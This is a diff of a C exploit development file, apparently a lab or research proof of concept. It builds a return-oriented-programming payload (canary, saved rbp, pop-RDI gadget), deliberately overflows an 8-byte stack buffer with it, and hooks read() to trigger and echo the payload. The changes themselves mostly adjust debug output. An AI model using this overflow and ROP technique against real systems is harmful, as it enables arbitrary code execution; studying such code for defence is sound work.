@@ -365,6 +365,8 @@ static void dumpload(PayloadPtr plp) {
 } // dumpload()
 
 static void doFixups(PayloadPtr plp) {
+	printf("In doFixups()\n");
+
 	plp->pl_canary    = fixupAddressUnion(plp->pl_canary);
 	plp->pl_rbp       = fixupAddressUnion(plp->pl_rbp);
 	plp->pl_popRDI    = fixupAddressUnion(plp->pl_popRDI);
@@ -378,7 +380,7 @@ static void doFixups(PayloadPtr plp) {
 static void overflow(Pointer src, size_t n) {
 	char dst[8] = {0};
 
-	printf("In overflow(), &dst: %p, n: %td\n", dst, n);
+	printf("In overflow()\n");
 
 	// Fixups
 	buffer_base = &dst;
@@ -390,7 +392,7 @@ dumpload((PayloadPtr) src);
 } // overflow()
 
 ssize_t read(int fd, void *buf, size_t count) {
-	initialize(); // (or libc_read() won't be defined
+	initialize();
 	ssize_t result = libc_read(fd, buf, count);
 
 	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);
@@ -426,7 +428,6 @@ ssize_t read(int fd, void *buf, size_t count) {
 				} // if
 			} // if
 
-dumpload(&payload);
 			// Generate the payload that we will "echo" back
                         unsigned char sPayload64[4096];
                         size_t nPayload64 = encode64((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
@@ -453,7 +454,6 @@ dumpload(&payload);
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
 		else if (!strncmp(s_testload, p, strlen(s_testload))) {
-			dumpload(&payload);
 			overflow((Pointer)&payload, sizeof(payload));
 		}
 		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
@@ -482,9 +482,9 @@ int main(int argc, char **argv)
 	assert(getpagesize() == 4096);
 	assert((-1^(getpagesize()-1))==0xfffffffffffff000);
 
+	printf("Running as an executable\n");
         initialize();
         makeload(&payload);
-        dumpload(&payload);
         dumpload(&payload);
         overflow((char *) &payload, sizeof(payload));
 } // main()
